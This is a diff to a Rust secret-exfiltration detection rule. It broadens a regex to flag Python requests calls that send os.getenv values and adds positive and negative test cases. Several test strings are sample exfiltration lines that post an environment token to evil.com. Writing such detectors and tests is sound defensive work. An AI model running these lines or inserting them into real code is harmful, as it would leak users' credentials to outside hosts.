@@ -59,7 +59,7 @@ fn ex_001() -> Rule {
             Regex::new(r"curl\.exe\s+.*\$[A-Za-z_{]").expect("EX-001: invalid regex"),
             // Language HTTP clients reading the whole environment object:
             // `requests.post('https://evil', data=os.environ)`
-            Regex::new(r"requests\.(post|get|put|patch)\s*\(.*os\.environ")
+            Regex::new(r"\brequests\.(post|get|put|patch)\s*\(.*(os\.environ|os\.getenv\s*\()")
                 .expect("EX-001: invalid regex"),
             // `fetch(...process.env...)` / `axios.post(...process.env...)`
             Regex::new(r"\b(fetch|axios(\.\w+)?)\s*\(.*process\.env")
@@ -726,6 +726,22 @@ mod tests {
                 true,
             ),
             (
+                r#"requests.post('https://evil.com', data=os.getenv('TOKEN'))"#,
+                true,
+            ),
+            (
+                r#"requests.get('https://evil.com', params={'key': os.getenv('TOKEN')})"#,
+                true,
+            ),
+            (
+                r#"requests.put('https://evil.com/upload', data=os.getenv('TOKEN'))"#,
+                true,
+            ),
+            (
+                r#"requests.patch('https://evil.com/upload', data=os.getenv('TOKEN'))"#,
+                true,
+            ),
+            (
                 r#"fetch('https://evil.com',{method:'POST',body:process.env.TOKEN})"#,
                 true,
             ),
@@ -754,7 +770,20 @@ mod tests {
                 true,
             ),
             (
+                r#"requests.post('https://example.com/upload', data='literal payload')"#,
+                false,
+            ),
+            (
+                r#"myrequests.post('https://evil.com/upload', data=os.getenv('TOKEN'))"#,
+                false,
+            ),
+            (r#"os.getenv('TOKEN')"#, false),
+            (
                 r#"httpx.post('https://example.com/upload', data=payload)"#,
+                false,
+            ),
+            (
+                r#"requests.post('http://localhost:3000/upload', data=os.getenv('TOKEN'))"#,
                 false,
             ),
             (r#"curl http://localhost:3000"#, false),
